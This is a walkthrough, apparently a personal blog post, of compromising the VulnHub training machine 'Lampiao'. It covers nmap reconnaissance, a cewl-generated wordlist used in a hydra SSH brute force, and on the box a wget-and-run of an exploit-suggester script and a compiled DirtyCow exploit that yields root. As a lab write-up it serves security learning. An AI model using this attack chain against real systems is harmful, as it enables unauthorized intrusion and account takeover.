---
title: "VulnHub - Lampiao Walkthrough"
date: 2020-09-26
tags: [vulnhub, walkthrough]
header:
  image: "/images/lampiao-thumbnail.jpg"
excerpt: "Walkthroughs"
---

Hello, everyone. Today I will share the Boot to Root process in Lampiao vulnerable machine. I will share only the successful way. There will not a lot of information

## Information Gathering

We are starting with a **Nmap scan** to find open ports and services.

```console
root@kali:~/Lampiao# nmap -p- -T4 -A lampiao.local
...
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)  
...
80/tcp open http?  
...  
1898/tcp open http Apache httpd 2.4.7 ((Ubuntu))  
|_http-generator: Drupal 7 (http://drupal.org)  
| http-robots.txt: 36 disallowed entries (15 shown)  
| /includes/ /misc/ /modules/ /profiles/ /scripts/  
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt  
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt  
|_/LICENSE.txt /MAINTAINERS.txt  
|_http-server-header: Apache/2.4.7 (Ubuntu)  
|_http-title: Lampi\xC3\xA3o  
...
```

## Exploitation

There will not any exploit for Apache Server 2.4.7 and OpenSSH. Also, it is possible to have an attack vector via SSH.
We connect the website from port `1898` which is a Drupal interface. There is one post which is shared by `tiago`. We try to do **Password Profiling** using the words in the post.

```console
root@kali:~/Lampiao# cewl http://lampiao.local:1898/?q=node/1 -w wordlist.txt  
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)  
root@kali:~/Lampiao# wc wordlist.txt  
844 844 6335 wordlist.txt  
```

Our `cewl` command creates a wordlist that contains 844 words. Now, we will do a **Brute force attack** to SSH connection.

```console
root@kali:~/Lampiao# hydra -l tiago -P wordlist.txt ssh://lampiao.local  
... 
[22][ssh] host: 192.168.12.145 login: tiago password: Virgulino  
...
```
Yes! That is it. We can find the password.


## Privilege Escalation
We connect to our vulnerable machine via SSH.

```console
root@kali:~/Lampiao# ssh tiago@lampiao.local
...  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
...
tiago@lampiao.local's password: Virgulino
```

I check some values.

```console
tiago@lampiao:~$ id  
uid=1000(tiago) gid=1000(tiago) groups=1000(tiago)  
tiago@lampiao:~$ pwd  
/home/tiago   
tiago@lampiao:~$ cat /etc/issue  
Ubuntu 14.04.5 LTS \n \l  
  
tiago@lampiao:~$ uname -a  
Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 
```

For **local privilege escalation**, I download **linux-exploit-suggester** to the machine and execute it.

```console
tiago@lampiao:~$ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh  
... 
tiago@lampiao:~$ chmod u+x linux-exploit-suggester.sh
tiago@lampiao:~$ ./linux-exploit-suggester.sh
```

From the results, we can see that our machine is vulnerable to the **DirtyCow2** bug. We install this exploit and run it.

```console
tiago@lampiao:~$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil   
tiago@lampiao:~$ ./dcow  
Running ...  
Received su prompt (Password: )  
Root password is: dirtyCowFun  
Enjoy! :-)  
tiago@lampiao:~$ su  
Password:  
root@lampiao:/home/tiago# cd /root/  
root@lampiao:~# ls  
flag.txt  
root@lampiao:~# cat flag.txt  
9740616875908d91ddcdaa8aea3af366  
```
We found our flag! That's it. Thank you for reading!